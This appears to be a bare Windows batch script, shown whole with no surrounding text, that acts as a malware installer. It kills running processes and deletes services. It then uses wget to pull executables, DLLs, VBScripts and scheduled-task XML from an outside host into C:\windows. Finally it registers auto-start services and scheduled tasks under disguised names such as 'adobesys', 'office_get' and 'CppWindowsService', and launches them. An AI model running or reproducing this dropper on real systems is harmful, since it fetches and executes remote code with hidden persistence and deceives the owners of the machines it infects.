taskkill /f /im sys1.exe
taskkill /f /im sys2.exe
taskkill /f /im sys3.exe
sc delete CppWindowsService
sc delete adobesys
wget http://troglo.homepc.it/win/sys3.dll -O c:\windows\sys3.dll
wget http://troglo.homepc.it/win/office_get.xml -O c:\windows\office_get.xml
wget http://troglo.homepc.it/win/get.vbs -O c:\windows\get.vbs
schtasks /delete /tn office_get /F
schtasks /create /tn office_get /xml %windir%\office_get.xml /F
schtasks /delete /tn CppWindowsService /F
schtasks /create /tn CppWindowsService /xml %windir%\CppWindowsService.xml /F
schtasks /delete /tn adobesys /F
schtasks /create /tn adobesys /xml %windir%\adobesys.xml /F
wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
wget http://troglo.homepc.it/win/sys3.exe -O c:\windows\sys3.exe
sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
sc create adobesys binPath= c:\windows\sys3.exe DisplayName= "CppWindowsService" start= auto
wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\svc.vbs
wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
wget http://troglo.homepc.it/win/libcurl.dll -O c:\windows\libcurl.dll
wget http://troglo.homepc.it/win/libcrypto-1_1.dll -O c:\windows\libcrypto-1_1.dll
cscript c:\windows\svc.vbs
net start CppWindowsService
 